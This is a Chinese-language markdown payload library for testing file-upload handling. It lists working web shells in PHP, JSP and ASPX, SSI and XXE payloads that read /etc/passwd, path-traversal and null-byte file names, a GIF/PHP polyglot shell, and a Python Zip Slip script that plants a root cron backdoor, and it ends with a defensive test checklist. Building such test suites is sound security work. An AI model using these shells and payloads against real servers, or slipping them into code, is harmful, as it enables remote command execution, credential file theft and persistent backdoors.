# 文件上传攻击载荷库

> 用于 A2 注入 + A5 异常测试的文件上传专项扩展。

---

## 恶意文件类型

### Web Shell

#### PHP
```php
<?php system($_GET['cmd']); ?>
<?php echo file_get_contents('/etc/passwd'); ?>
```

#### JSP
```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

#### ASPX
```aspx
<%@ Page Language="C#" %>
<% System.Diagnostics.Process.Start("cmd.exe", "/c " + Request["cmd"]); %>
```

### 服务端包含 (SSI)

```html
<!--#exec cmd="whoami" -->
<!--#include file="/etc/passwd" -->
```

### SVG (XXE via file upload)

```xml
<?xml version="1.0"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <text x="10" y="20">&xxe;</text>
</svg>
```

---

## 文件名攻击

### 路径穿越

```
../../../etc/cron.d/evil
..\..\..\Windows\System32\drivers\etc\hosts
....//....//....//etc/passwd
```

### 空字节截断（旧版本）

```
shell.php%00.jpg
shell.php\x00.jpg
```

### 特殊字符

```
shell.php%20
shell.php.
shell.php..
shell.php .jpg     (带空格)
shell.php:.jpg     (NTFS 流)
CON, PRN, AUX      (Windows 保留名)
```

---

## 内容类型绕过

### MIME 类型欺骗

```
真实内容: <?php ... ?>
Content-Type: image/jpeg（声明）
→ 如果服务端只用 Content-Type 判断，可能绕过
```

### 魔术字节伪造

```
文件开头添加 GIF89a + 后续 PHP 代码
→ 绕过基于魔术字节的检查同时保留可执行性
```

### 双重扩展名

```
shell.php.jpg
shell.php.jpeg
shell.php.png
```

### 多语言文件

```
# 同时是有效的图片和 PHP 代码
GIF89a<?php system($_GET['cmd']); ?>
→ 图片预览正常，但可被 PHP 解释器执行
```

---

## 大小与数量攻击

### 超大文件

- 接近上传限制的文件（如限制 100MB → 上传 99MB）
- 超过限制 → 预期返回 413 或友好拒绝
- 恶意 Zip Bomb（解压后爆炸性膨胀）

### 空文件

- Content-Length: 0
- 文件名为空
- 文件内容为空的合法扩展名

### 并发上传

- 同时上传 100 个文件
- 同一文件名并发上传 → 竞态条件

### Zip Slip

```python
# 创建包含路径穿越的 zip
import zipfile
z = zipfile.ZipFile('evil.zip', 'w')
z.writestr('../../../etc/cron.d/evil', '* * * * * root /tmp/backdoor.sh')
z.close()
```

---

## 服务端处理漏洞

### 图像处理库注入

```
ImageMagick (CVE-2016-3714 / ImageTragick)
上传包含恶意 URL 的图片 → 触发 SSRF/RCE
```

### Ghostscript RCE

```
上传包含恶意 PostScript 的 EPS → 触发命令执行
```

### FFmpeg SSRF

```
上传包含恶意 HLS playlist 的视频 → 触发 SSRF
```

---

## 测试 Checklist

- [ ] 上传合法文件 → 正常
- [ ] 上传 PHP/JSP/ASPX → 阻止或重命名
- [ ] 路径穿越文件名 → 阻止
- [ ] 双重扩展名 → 阻止
- [ ] 多语言文件 → 按内容判断
- [ ] 超大文件 → 拒绝或限流
- [ ] 并发上传 → 无竞态
- [ ] Zip Slip → 阻止路径穿越
- [ ] 空文件名/空内容 → 友好拒绝
- [ ] 特殊字符文件名 → 正确处理
